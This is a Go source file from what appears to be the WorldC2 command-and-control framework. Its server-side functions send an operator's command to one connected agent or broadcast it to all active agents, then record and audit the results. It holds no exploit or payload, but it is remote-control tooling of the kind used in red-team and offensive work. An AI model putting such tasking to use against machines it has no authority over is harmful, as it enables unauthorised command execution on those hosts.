package c2

import (
	"context"
	"fmt"
	"sync"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/db"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
)

// CreateTaskWithContext sends a command to an agent with context for cancellation.
func (s *Server) CreateTaskWithContext(ctx context.Context, agentID, command string, timeoutSec uint32) (*proto.TaskResult, error) {
	sess := s.resolveSession(agentID)
	if sess == nil {
		return nil, fmt.Errorf("agent not found: %s", agentID)
	}
	if !sess.IsActive() {
		return nil, fmt.Errorf("agent not active")
	}

	taskID := generateTaskID()
	task := &proto.Task{TaskId: taskID, Command: command, TimeoutSec: timeoutSec}

	// Persist and audit the task exactly like CreateTask does. Without this,
	// commands issued through /api/cmd and /api/broadcast (the operator
	// console's main flow) never landed in the tasks table nor in the audit
	// log, and the trailing UpdateTaskResult updated a row that never existed.
	s.db.InsertTask(&db.TaskRecord{
		ID: taskID, SessionID: sess.ID, Command: command, IssuedAt: time.Now(),
	})
	s.db.LogAction(0, "task", fmt.Sprintf("%s: %s", sess.Hostname, command))

	resultCh := sess.RegisterPendingTask(taskID)
	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		sess.ResolveTask(taskID, nil)
		return nil, fmt.Errorf("send: %w", err)
	}

	// Use the smaller of context deadline or task timeout
	taskTimeout := time.Duration(timeoutSec) * time.Second
	if taskTimeout == 0 {
		taskTimeout = 30 * time.Second
	}

	// Create a derived context with the task timeout
	taskCtx, cancel := context.WithTimeout(ctx, taskTimeout)
	defer cancel()

	select {
	case <-taskCtx.Done():
		sess.ResolveTask(taskID, nil)
		if taskCtx.Err() == context.DeadlineExceeded {
			return nil, fmt.Errorf("task timed out")
		}
		return nil, fmt.Errorf("task cancelled: %w", taskCtx.Err())
	case result, ok := <-resultCh:
		if !ok {
			return nil, fmt.Errorf("session closed before task completed")
		}
		if result != nil {
			s.db.UpdateTaskResult(taskID, result.Output, int(result.ExitCode), result.Success)
		}
		return result, nil
	case <-sess.Done():
		return nil, fmt.Errorf("session closed before task completed")
	}
}

// BroadcastTaskWithContext sends a command to all active sessions with context.
func (s *Server) BroadcastTaskWithContext(ctx context.Context, command string) map[string]*proto.TaskResult {
	results := make(map[string]*proto.TaskResult)
	var mu sync.Mutex
	var wg sync.WaitGroup

	s.sessions.Range(func(key, value interface{}) bool {
		select {
		case <-ctx.Done():
			return false // Stop broadcasting if context is cancelled
		default:
		}

		sess := value.(*session.Session)
		if !sess.IsActive() {
			return true
		}

		wg.Add(1)
		go func(id string) {
			defer wg.Done()
			result, err := s.CreateTaskWithContext(ctx, id, command, 30)
			mu.Lock()
			defer mu.Unlock()
			if err != nil {
				results[id] = &proto.TaskResult{TaskId: id, Success: false, ErrorMessage: err.Error()}
			} else {
				results[id] = result
			}
		}(sess.ID)
		return true
	})

	wg.Wait()
	return results
}
